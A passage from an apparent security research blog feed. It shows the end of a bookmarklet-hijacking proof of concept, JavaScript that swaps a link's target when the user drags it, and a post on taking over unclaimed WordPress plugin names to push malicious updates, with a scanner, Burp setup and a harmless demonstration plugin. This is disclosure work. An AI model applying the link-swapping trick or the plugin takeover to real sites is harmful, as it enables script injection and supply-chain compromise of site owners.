            <span class="kd">const</span> <span class="nx">newLink</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">javascript: (() =&gt; { alert(2); })();</span><span class="dl">"</span><span class="p">;</span>
            <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">newLink</span><span class="p">;</span>

            <span class="c1">// Set the data for the drag event to the new link</span>
            <span class="nx">event</span><span class="p">.</span><span class="nx">dataTransfer</span><span class="p">.</span><span class="nf">setData</span><span class="p">(</span><span class="dl">'</span><span class="s1">text/uri-list</span><span class="dl">'</span><span class="p">,</span> <span class="nx">newLink</span><span class="p">);</span>
            <span class="nx">event</span><span class="p">.</span><span class="nx">dataTransfer</span><span class="p">.</span><span class="nf">setData</span><span class="p">(</span><span class="dl">'</span><span class="s1">text/plain</span><span class="dl">'</span><span class="p">,</span> <span class="nx">newLink</span><span class="p">);</span>

            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Link location changed to:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">href</span><span class="p">);</span>
        <span class="p">});</span>

        <span class="nx">linkElement</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">dragend</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// Reset the link back to its original value after the drag operation has ended</span>
            <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">originalLink</span><span class="p">;</span>
            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Link location reset to:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">href</span><span class="p">);</span>
        <span class="p">});</span>
    <span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span>
    <span class="o">&lt;</span><span class="nx">hr</span><span class="o">&gt;</span>

    <span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span><span class="nx">Firefox</span> <span class="nx">Proof</span> <span class="k">of</span> <span class="nx">Concept</span><span class="o">&lt;</span><span class="sr">/h2</span><span class="err">&gt;
</span>
    <span class="o">&lt;</span><span class="nx">h3</span><span class="o">&gt;</span><span class="nx">Steps</span> <span class="nx">to</span> <span class="nx">reproduce</span><span class="o">&lt;</span><span class="sr">/h3</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">.</span> <span class="o">&lt;</span><span class="nx">strong</span><span class="o">&gt;</span><span class="nx">Double</span><span class="o">-</span><span class="nx">check</span> <span class="nx">that</span> <span class="nx">the</span> <span class="nx">link</span> <span class="nx">executes</span><span class="o">&lt;</span><span class="sr">/strong&gt; &lt;code&gt;alert</span><span class="se">(</span><span class="sr">1</span><span class="se">)</span><span class="sr">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;</span><span class="sr">/p</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="mi">2</span><span class="p">.</span> <span class="o">&lt;</span><span class="nx">strong</span><span class="o">&gt;</span><span class="nx">Right</span><span class="o">-</span><span class="nx">click</span> <span class="o">&amp;</span> <span class="nx">Bookmark</span> <span class="nx">link</span><span class="p">...</span> <span class="o">&amp;</span> <span class="nx">Save</span><span class="o">&lt;</span><span class="sr">/strong&gt;&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="mi">3</span><span class="p">.</span> <span class="o">&lt;</span><span class="nx">strong</span><span class="o">&gt;</span><span class="nx">Double</span><span class="o">-</span><span class="nx">check</span> <span class="nx">that</span> <span class="nx">the</span> <span class="nx">link</span> <span class="nx">executes</span><span class="o">&lt;</span><span class="sr">/strong&gt; &lt;code&gt;alert</span><span class="se">(</span><span class="sr">1</span><span class="se">)</span><span class="sr">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;</span><span class="sr">/p</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="mi">4</span><span class="p">.</span> <span class="o">&lt;</span><span class="nx">strong</span><span class="o">&gt;</span><span class="nx">Click</span> <span class="nx">the</span> <span class="nx">link</span> <span class="k">in</span> <span class="nx">Bookmarks</span><span class="p">;</span> <span class="nx">it</span> <span class="nx">executes</span><span class="o">&lt;</span><span class="sr">/strong&gt; &lt;code&gt;alert</span><span class="se">(</span><span class="sr">2</span><span class="se">)</span><span class="sr">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;</span><span class="sr">/p</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript: (() =&gt; { alert(1); })();</span><span class="dl">"</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">myLink_2</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Save</span> <span class="k">this</span> <span class="nx">cool</span> <span class="nx">bookmarklet</span><span class="o">!&lt;</span><span class="sr">/a</span><span class="err">&gt;
</span>
    <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
        <span class="kd">const</span> <span class="nx">linkElement_2</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">myLink_2</span><span class="dl">'</span><span class="p">);</span>
        <span class="kd">const</span> <span class="nx">originalLink_2</span> <span class="o">=</span> <span class="nx">linkElement_2</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>

        <span class="nx">linkElement_2</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">mousedown</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">newLink</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">javascript: (() =&gt; { alert(2); })();</span><span class="dl">"</span><span class="p">;</span>
            <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">newLink</span><span class="p">;</span>

            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Link location changed to:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">href</span><span class="p">);</span>
        <span class="p">});</span>

        <span class="nx">linkElement_2</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">mouseover</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// Reset the link back to its original value after the drag operation has ended</span>
            <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">originalLink</span><span class="p">;</span>
            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Link location reset to:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">href</span><span class="p">);</span>
        <span class="p">});</span>
    <span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/body</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/html</span><span class="err">&gt;
</span></code></pre></div></div>]]></content><author><name>vavkamil</name></author><category term="Ethical hacking" /><category term="Tools" /><category term="Security Research" /><category term="xss" /><category term="javascript" /><category term="bookmarklet" /><category term="hijacking" /><summary type="html"><![CDATA[I noticed an exciting link shared on Hacker News titled “Wait, what’s a bookmarklet?”. I have been using them for a long time, and while reading that discussion, it was nice to see people sharing useful ones they use to make their everyday tasks easier.]]></summary></entry><entry><title type="html">WordPress Plugin Confusion: How an update can get you pwned</title><link href="http://localhost:4000/blog/2021-11-25-wordpress-plugin-confusion-update-can-get-you-pwned/" rel="alternate" type="text/html" title="WordPress Plugin Confusion: How an update can get you pwned" /><published>2021-11-25T01:00:00+01:00</published><updated>2021-11-25T01:00:00+01:00</updated><id>http://localhost:4000/blog/wordpress-plugin-confusion-update-can-get-you-pwned</id><content type="html" xml:base="http://localhost:4000/blog/2021-11-25-wordpress-plugin-confusion-update-can-get-you-pwned/"><![CDATA[<p>tl;dr: Like the novel “<a href="https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610">Dependency Confusion</a>” supply chain attack, it is possible to take over internally developed WordPress plugins unclaimed on the wordpress.org registry. Updating the plugin might result in the RCE or installing a PHP backdoor. You can use <a href="https://github.com/vavkamil/wp-update-confusion">wp_update_confusion.py</a> to scan for potential targets. To protect your website, please read this <a href="https://make.wordpress.org/core/2021/06/29/introducing-update-uri-plugin-header-in-wordpress-5-8/">announcement</a>.</p>

<hr />

<h2 id="table-of-contents">Table of contents</h2>

<ul>
  <li><a href="#main-idea">Main idea</a></li>
  <li><a href="#the-wordpressorg-plugins-directory">The WordPress.org Plugins Directory</a>
    <ul>
      <li><a href="#theme-approval-process">Theme approval process</a></li>
      <li><a href="#plugin-approval-process">Plugin approval process</a></li>
    </ul>
  </li>
  <li><a href="#scanner-to-detect-vulnerable-plugins">Scanner to detect vulnerable plugins</a></li>
  <li><a href="#debugging-wp-updates-with-burp">Debugging WP updates with Burp</a></li>
  <li><a href="#publishing-wordpress-plugin-poc">Publishing WordPress plugin PoC</a></li>
  <li><a href="#how-to-defend-yourself">How to defend yourself</a>
    <ul>
      <li><a href="#protecting-themes">Protecting themes</a></li>
      <li><a href="#protecting-plugins">Protecting plugins</a></li>
    </ul>
  </li>
  <li><a href="#bug-bounty-hunting">Bug Bounty hunting</a></li>
</ul>

<hr />

<h2 id="main-idea">Main idea</h2>

<p>I recently did a regular secure code review of one WordPress instance and noticed a new internally developed plugin. It occurred to me that if an attacker would be able to impersonate the plugins’ slug and upload a malicious version to the WordPress Plugin Directory, we might see an update notification if the SVN version is bumped to a higher one than is used.</p>

<p>That would introduce the “<a href="https://en.wikipedia.org/wiki/Confused_deputy_problem">Confused deputy problem</a>” attack scenario, where the privileged user, instructed to update all plugins regularly, inadvertently infects the instance with malware.</p>

<p>One could argue that the confused deputy shouldn’t blindly update plugins without checking the changelog first, but to be honest, the updates are released so often it quickly becomes monotonous. And we shouldn’t put them in that position in the first place, as it’s security through obscurity, believing that an outside attacker can’t figure out the plugin’s name.</p>

<p>To confirm the hypothesis, I began to research if it’s, in fact, a possible attack vector and how widespread it is.</p>

<p><img src="/assets/img/2021/11/script.png" alt="script.png" /></p>

<h2 id="the-wordpressorg-plugins-directory">The WordPress.org Plugins Directory</h2>

<p>WordPress.org offers free hosting to anyone who wishes to develop a plugin. All code in the directory should be as secure as possible, but security is the ultimate responsibility of the plugin developer.</p>

<p>The WordPress.org plugins directory is the easiest way for potential users to download and install any plugin. Once a new plugin is approved, a developer gets access to an (SVN) Subversion Repository. The SVN repository is a release repository, not a development one. All commits, code, or readme files, will trigger a regeneration of the zip files associated with the plugin.</p>

<p>WordPress’ integration with the plugin directory means the user can update the plugin in a couple of clicks. Users are alerted to updates when the plugin version in SVN increases.</p>

<p>In theory, anyone following the guidelines and passing the review process can upload the plugin and distribute the malicious version later. Unfortunately, while reading the developer documentation, I found the following info:</p>

<blockquote>
  <p>Why is my submission failing saying my plugin name already exists?
<em>You’re trying to use a plugin with a permalink that exists <strong>outside</strong> WordPress.org and has a significant user base.</em>
<em>It’s important to understand that the way the plugin update API works is that it compares the plugin folder name (i.e. the permalink) to every plugin it has hosted on WordPress.org. If there’s a match, then it checks for updates and users are prompted to upgrade.</em>
<em>When that happens, users of the ‘original’ plugin (the one we don’t host) would upgrade to the one from WordPress.org and, if that isn’t what you actually wanted to do, you could break their sites.</em>
<em>Sometimes this situation develops when a company or person releases their plugin privately (via Github for example) and decides they want to re-release it on WordPress.org. In those cases, we recommend you email us and we’ll walk you through how to get past the error.</em></p>
</blockquote>

<p>Implying that WordPress’ Security team is internally tracking all the unclaimed plugin names used in the wild, number of installations, and there is some magic threshold value preventing a large-scale supply chain attack. But it also validates the assumption that the attack vector is indeed possible.</p>

<h3 id="theme-approval-process">Theme approval process</h3>

<p>Most business websites using WordPress have a custom theme, and the slug name is almost always in the HTML source code to load JS/CSS files from the theme’s asset directory. Detecting the theme slug and taking over the unclaimed ones would be the easiest way.</p>

<p>WordPress Theme Directory does have a rigorous <a href="https://make.wordpress.org/themes/handbook/review/#theme-review-process">Theme Review Process</a> &amp; <a href="https://make.wordpress.org/themes/handbook/review/required/">Theme Review Requirements</a>, to ensure quality and security. New themes are generally put to a higher standard to attract new users.</p>

<p>It would be hard for me to develop a frontend appealing to a general audience and pass the review, so I decided not to worry about them.</p>

<h3 id="plugin-approval-process">Plugin approval process</h3>

<p>On the other hand, it’s impossible to detect most plugins via a passive check, and it will be tough to create a custom wordlist. But the review process for WordPress Plugin Directory is not that strict, and the <a href="https://developer.wordpress.org/plugins/wordpress-org/detailed-plugin-guidelines/">guidelines</a> are relatively simple.</p>

<p>While reading the docs, I was mainly interested in the restrictions for plugin names. Being already familiar with WordPress, I knew that the slug name could only contain lowercase alphanumeric characters divided by dash, but I also learned there are more restrictions:</p>

<blockquote>
  <p>Plugins must respect trademarks, copyrights, and project names.
<em>Names cannot be “reserved” for future use or to protect brands.</em>
<em>The use of trademarks or other projects as the sole or initial term of a plugin slug is prohibited unless proof of legal ownership/representation can be confirmed.</em>
<em>This policy extends to plugin slugs, and we will not permit a slug to begin with another product’s term.</em></p>
</blockquote>

<p>That threw me off because apparently, there is a check for trademarked brands, which will protect most companies and prohibit uploading unclaimed plugins (assuming they use their company name as a prefix for internal plugins). I didn’t want to give up yet, so I started digging around, and it turns out the WordPress team is a fan of transparency, and the whole approval process is automated and, most importantly, fully open-sourced.</p>

<p>By reviewing the <code class="language-plaintext highlighter-rouge">[class-upload-handler.php](https://meta.trac.wordpress.org/browser/sites/trunk/wordpress.org/public_html/wp-content/plugins/plugin-directory/shortcodes/class-upload-handler.php)</code> checks, we can see a couple of essential functions:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">process_upload()</code>
    <ul>
      <li>Determine the plugin slug based on the name of the plugin in the main plugin file. (alphanumeric and dash)</li>
    </ul>
  </li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">88</span>	                <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">plugin_slug</span> <span class="o">=</span> <span class="nf">remove_accents</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">plugin</span><span class="p">[</span><span class="s1">'Name'</span><span class="p">]</span> <span class="p">);</span>
<span class="mi">89</span>	                <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">plugin_slug</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span> <span class="s1">'/[^a-z0-9 _.-]/i'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">plugin_slug</span> <span class="p">);</span>
<span class="mi">90</span>	                <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">plugin_slug</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span> <span class="s1">'_'</span><span class="p">,</span> <span class="s1">'-'</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">plugin_slug</span> <span class="p">);</span>
<span class="mi">91</span>	                <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">plugin_slug</span> <span class="o">=</span> <span class="nf">sanitize_title_with_dashes</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">plugin_slug</span> <span class="p">);</span>
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">has_reserved_slug()</code>
    <ul>
      <li>Make sure it doesn’t use a slug deemed not to be used by the public. (common WordPress paths like wp-admin are not allowed)</li>
    </ul>
  </li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">388</span>	        <span class="k">public</span> <span class="k">function</span> <span class="n">has_reserved_slug</span><span class="p">()</span> <span class="p">{</span>
<span class="mi">389</span>	                <span class="nv">$reserved_slugs</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="mi">390</span>	                        <span class="c1">// Plugin Directory URL parameters.</span>
<span class="mi">391</span>	                        <span class="s1">'about'</span><span class="p">,</span>
<span class="mi">392</span>	                        <span class="s1">'admin'</span><span class="p">,</span>
<span class="mi">393</span>	                        <span class="s1">'browse'</span><span class="p">,</span>
<span class="mi">394</span>	                        <span class="s1">'category'</span><span class="p">,</span>
<span class="mi">395</span>	                        <span class="s1">'developers'</span><span class="p">,</span>
<span class="mi">396</span>	                        <span class="s1">'developer'</span><span class="p">,</span>
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">has_trademarked_slug()</code>
    <ul>
      <li>Make sure it doesn’t use a TRADEMARK protected slug. (trademarked company names are not allowed)</li>
    </ul>
  </li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">430</span>	        <span class="k">public</span> <span class="k">function</span> <span class="n">has_trademarked_slug</span><span class="p">()</span> <span class="p">{</span>
<span class="mi">431</span>	                <span class="nv">$trademarked_slugs</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="mi">432</span>	                        <span class="s1">'adobe-'</span><span class="p">,</span>
<span class="mi">433</span>	                        <span class="s1">'adsense-'</span><span class="p">,</span>
<span class="mi">434</span>	                        <span class="s1">'advanced-custom-fields-'</span><span class="p">,</span>
<span class="mi">435</span>	                        <span class="s1">'adwords-'</span><span class="p">,</span>
<span class="mi">436</span>	                        <span class="s1">'akismet-'</span><span class="p">,</span>
<span class="mi">437</span>	                        <span class="s1">'all-in-one-wp-migration'</span><span class="p">,</span>
<span class="mi">438</span>	                        <span class="s1">'amazon-'</span><span class="p">,</span>
<span class="mi">439</span>	                        <span class="s1">'android-'</span><span class="p">,</span>
<span class="mi">440</span>	                        <span class="s1">'apple-'</span><span class="p">,</span>
<span class="mi">441</span>	                        <span class="s1">'applenews-'</span><span class="p">,</span>
<span class="mi">442</span>	                        <span class="s1">'aws-'</span><span class="p">,</span>
</code></pre></div></div>

<p>Surprisingly, big enough (FAANG) style companies can request to add themselves to the list (<code class="language-plaintext highlighter-rouge">$trademarked_slugs</code>) of prohibited terms, and any uploads of plugins containing that name will automatically fail. Most importantly, there is also the check preventing uploads using popular plugin names already used in the wild:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">231</span>	                <span class="k">if</span> <span class="p">(</span> <span class="nb">function_exists</span><span class="p">(</span> <span class="s1">'wporg_stats_get_plugin_name_install_count'</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
<span class="mi">232</span>	                        <span class="nv">$installs</span> <span class="o">=</span> <span class="nf">wporg_stats_get_plugin_name_install_count</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">plugin</span><span class="p">[</span><span class="s1">'Name'</span><span class="p">]</span> <span class="p">);</span>
<span class="mi">233</span>	
<span class="mi">234</span>	                        <span class="k">if</span> <span class="p">(</span> <span class="nv">$installs</span> <span class="o">&amp;&amp;</span> <span class="nv">$installs</span><span class="o">-&gt;</span><span class="n">count</span> <span class="o">&gt;=</span> <span class="mi">100</span> <span class="p">)</span> <span class="p">{</span>
<span class="mi">235</span>	                                <span class="nv">$error</span> <span class="o">=</span> <span class="nf">__</span><span class="p">(</span> <span class="s1">'Error: That plugin name is already in use.'</span><span class="p">,</span> <span class="s1">'wporg-plugins'</span> <span class="p">);</span>
</code></pre></div></div>

<p>In conclusion, the WordPress Plugin Confusion attack against internally developed plugins on business websites is indeed possible. Still, the security mechanism prevents large-scale supply chain attacks against unclaimed plugins installed on more than 100 websites.</p>

<h2 id="scanner-to-detect-vulnerable-plugins">Scanner to detect vulnerable plugins</h2>

<p>I wrote a simple tool <a href="https://github.com/vavkamil/wp-update-confusion">wp_update_confusion.py</a>, which will passively detect any plugins from the front page response and check if the plugin name contains only the allowed characters. It then pings the WordPress SVN to verify if the slug is already claimed or not.</p>

<p>While scanning websites of HackerOne public bug bounty programs, it was reporting a ton of false positives. I quickly realized that it would be impossible to get any meaningful output without a database of paid WordPress plugins. And building one by myself would require a significant amount of time.</p>

<p>Instead of reinventing the wheel and knowing from the review process code that the WordPress team already has the data, I started looking around the website. Every plugin has an “Advanced View” tab, where one can see various graphs, such as active versions, downloads per day, install growth, etc.</p>

<p><img src="/assets/img/2021/11/downloads.png" alt="downloads.png" /></p>

<p>Poking around the API revealed one publicly available endpoint, which in fact, returns <em>all_time</em> number of downloads for any unclaimed plugin slug:</p>

<p><code class="language-plaintext highlighter-rouge">https://api.wordpress.org/stats/plugin/1.0/downloads.php?slug={plugin_name}&amp;historical_summary=1</code></p>

<p>In the end, having all the information needed to verify if we could take over the plugin resulted in much better results. Although I didn’t implement a brute-force option, which would be the best way how to earn bug bounties, so right now, it is only capable of detecting low hanging fruits :)</p>

<p>The way it works is:</p>

<p>1) Query the front-page and find all the plugins <code class="language-plaintext highlighter-rouge">re.findall("wp-content/plugins/(.*?)/", html)</code>
2) Check if the slug is allowed
3) Check if the slug is present in the SVN registry
4) Check if the slug is installed on more than 100 websites
5) Profit?</p>

<p><img src="/assets/img/2021/11/nuclei.png" alt="nuclei.png" /></p>

<h2 id="debugging-wp-updates-with-burp">Debugging WP updates with Burp</h2>

<p>The next step was to debug how the plugin mechanism exactly works. The easiest solution would be to review the code, but since I’m not that familiar with PHP, a black-box style test sounded like a better idea.</p>

<p>Since I like Burp Suite a lot, I decided to intercept the requests between the website and <code class="language-plaintext highlighter-rouge">wordpress.org API</code> via its proxy. Running the WordPress in Docker container is easy, but installing the SSL cert and routing all the external traffic via Burp wasn’t that simple.</p>

<p>After a lot of debugging, I came up with the following:</p>

<p>1) Configure <code class="language-plaintext highlighter-rouge">Proxy Listener</code> to listen on all interfaces</p>

<p>2) Add IP address of the Proxy as <code class="language-plaintext highlighter-rouge">extra_hosts</code> in <code class="language-plaintext highlighter-rouge">docker-compose.yml</code></p>

<p>3) Run <code class="language-plaintext highlighter-rouge">docker</code> and install the WordPress via <code class="language-plaintext highlighter-rouge">wp-cli</code></p>

<p>4) Download &amp; install Burp Suite certificate</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="c">#!/usr/bin/env sh</span>
   
   <span class="c"># Download &amp; install Burp Suite certificate</span>
   wget <span class="nt">-q</span> http://burp:8080/cert <span class="nt">-O</span> cert.der
   openssl x509 <span class="nt">-in</span> cert.der <span class="nt">-inform</span> DER <span class="nt">-out</span> cert.pem
   <span class="nb">mkdir</span> /usr/local/share/ca-certificates/extra
   <span class="nb">cp </span>cert.pem /usr/local/share/ca-certificates/extra/cert.crt
   update-ca-certificates
   <span class="nb">rm </span>cert.der cert.pem
</code></pre></div></div>

<p>5) Redirect all requests received by listener to my host</p>

<p>6) Replace all occurrences of <code class="language-plaintext highlighter-rouge">*api.wordpress.org*</code> to my host</p>

<p>You can see the final script here: <a href="https://github.com/vavkamil/wp2burp">https://github.com/vavkamil/wp2burp</a></p>

<p>After that, I could see that when the websites is checking if there are any updates available, it issues the following request:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /plugins/update-check/1.1/ HTTP/2
Host: api.wordpress.org
User-Agent: WordPress/5.3; http://127.0.0.1:31337/
Accept: */*
Accept-Encoding: gzip, deflate
Referer: https://api.wordpress.org/plugins/update-check/1.1/
Connection: close
Content-Length: 1778
Content-Type: application/x-www-form-urlencoded
Expect: 100-continue

plugins={...}
</code></pre></div></div>

<p>Where the JSON data contains a list of all installed plugins, e.g.:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">	</span><span class="p">{</span><span class="w">
      </span><span class="nl">"akismet\/akismet.php"</span><span class="p">:{</span><span class="w">
         </span><span class="nl">"Name"</span><span class="p">:</span><span class="s2">"Akismet Anti-Spam"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"PluginURI"</span><span class="p">:</span><span class="s2">"https:</span><span class="se">\/\/</span><span class="s2">akismet.com</span><span class="se">\/</span><span class="s2">"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"Version"</span><span class="p">:</span><span class="s2">"4.1.3"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"Description"</span><span class="p">:</span><span class="s2">"Used by millions, Akismet is quite possibly the best way in the world to &lt;strong&gt;protect your blog from spam&lt;</span><span class="se">\/</span><span class="s2">strong&gt;. It keeps your site protected even while you sleep. To get started: activate the Akismet plugin and then go to your Akismet Settings page to set up your API key."</span><span class="p">,</span><span class="w">
         </span><span class="nl">"Author"</span><span class="p">:</span><span class="s2">"Automattic"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"AuthorURI"</span><span class="p">:</span><span class="s2">"https:</span><span class="se">\/\/</span><span class="s2">automattic.com</span><span class="se">\/</span><span class="s2">wordpress-plugins</span><span class="se">\/</span><span class="s2">"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"TextDomain"</span><span class="p">:</span><span class="s2">"akismet"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"DomainPath"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="w">
         </span><span class="nl">"Network"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="w">
         </span><span class="nl">"RequiresWP"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="w">
         </span><span class="nl">"RequiresPHP"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="w">
         </span><span class="nl">"Title"</span><span class="p">:</span><span class="s2">"Akismet Anti-Spam"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"AuthorName"</span><span class="p">:</span><span class="s2">"Automattic"</span><span class="w">
      </span><span class="p">},</span><span class="w">
</span></code></pre></div></div>

<p>If there is a new version available, the websites received the following response:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/2 200 OK
Date: Sun, 10 Oct 2021 19:13:57 GMT
Content-Type: application/json
Access-Control-Allow-Origin: *
Cf-Cache-Status: DYNAMIC
Expect-Ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Report-To: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v3?s=NpTdm3rT6Twj%2FvltPnM2Lb627HEIH4tcXE%2FTqUW0ZSqB7QQlDef1ttcmizy5cx2qcGwpKR%2BmudmYA0tp0G5QVEJ8G4%2Fu%2Bh07GKDQfbBYlJext3lDiKXRNB0EHIi3lD35oLk%3D"}],"group":"cf-nel","max_age":604800}
Nel: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}
Server: cloudflare
Cf-Ray: 69c22b4018442794-PRG
Alt-Svc: h3=":443"; ma=86400, h3-29=":443"; ma=86400, h3-28=":443"; ma=86400, h3-27=":443"; ma=86400

{"plugins":{"akismet\/akismet.php":{"new_version":"4.2.1","package":"https:\/\/downloads.wordpress.org\/plugin\/akismet.4.2.1.zip"}}}

</code></pre></div></div>

<p>If you click on the update button, WordPress deletes the contents of the old plugin directory, and the .zip file containing a new version is downloaded and unzipped, effectively replacing all the files. Ethically exploiting this is tricky because, with any Proof of Concept, you will break the website.</p>

<p>But using the docker container to intercept and simulate the attack might be enough, as you can modify the response, so it will contain any version &amp; remote zip file you want:</p>

<p><img src="/assets/img/2021/11/plugin_version.png" alt="plugin_version.png" /></p>

<h2 id="publishing-wordpress-plugin-poc">Publishing WordPress plugin PoC</h2>

<p>I didn’t want to claim anyone’s plugin, as the update would inadvertently break the website (old plugin files will get deleted). Still, I had to simulate the attack to confirm that it works.</p>

<p>Fortunately for me, I already wrote a simple WP plugin two years ago, “<a href="https://github.com/vavkamil/xml-rpc-settings">XML-RPC Settings</a>” to understand how the various “xmlrpc.php” attack vectors work and how to defend against them. I never bothered to upload it to WordPress Plugin Directory, but there was a possibility that someone installed it from my GitHub. For example, it was on this blog before I migrated to GitHub pages. To be sure, I installed the plugin on six different websites a while ago when I was thinking about starting this research.</p>

<p>After reading WordPress developer guidelines and updating the readme, I submitted the plugin for review. The exact timeline was:</p>

<ul>
  <li>October 3rd, 2021
    <ul>
      <li>Successful Plugin Submission</li>
    </ul>
  </li>
  <li>October 5th, 2021
    <ul>
      <li>Review in Progress, issues with plugin code (wrong stable version tag, not unique enough function names)</li>
    </ul>
  </li>
  <li>October 5th, 2021
    <ul>
      <li>Fixed the version and asked for another review</li>
    </ul>
  </li>
  <li>October 7th, 2021
    <ul>
      <li>Your review has been successfully completed.</li>
    </ul>
  </li>
  <li>October 7th, 2021
    <ul>
      <li>Congratulations, the plugin hosting request for XML-RPC Settings has been approved.</li>
    </ul>
  </li>
</ul>

<p>One hour after the plugin was approved, I was granted commit access to your Subversion (SVN) repository and uploaded my plugin:</p>

